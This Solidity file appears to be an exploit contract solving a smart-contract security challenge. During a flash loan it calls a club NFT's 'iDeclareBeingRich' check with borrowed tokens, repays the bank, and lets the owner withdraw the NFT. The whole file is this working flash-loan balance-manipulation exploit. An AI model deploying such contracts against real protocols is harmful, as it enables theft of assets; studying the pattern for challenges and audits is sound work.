//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;


interface WealtPrivateClubNFT{
    function iDeclareBeingRich() external;
    function transferFrom(address from,address to,uint256 tokenId) external;
}

interface BankToken {
    function transfer(address to, uint256 amount) external;
}


contract FlashloanExecutor {

    address public TOKEN_ADDR;
    address public NFT_ARRD;
    address public BANK_ADDR;
    address public OWNER;

    constructor(address token_addr, address nft_addr, address bank_addr){
        TOKEN_ADDR = token_addr;
        NFT_ARRD = nft_addr;
        BANK_ADDR = bank_addr;
        OWNER = msg.sender;
    }

    modifier onlyOwner {
        require( msg.sender == OWNER , "Only owner can assess this function.");
        _;
    }


    function executeWithMoney(uint256 amount) external {
        WealtPrivateClubNFT(NFT_ARRD).iDeclareBeingRich();
        BankToken(TOKEN_ADDR).transfer(BANK_ADDR, amount);
    }

    function transferNFT(uint256 tokenId) public onlyOwner{
        WealtPrivateClubNFT(NFT_ARRD).transferFrom( address(this) , OWNER, tokenId);
    }
}
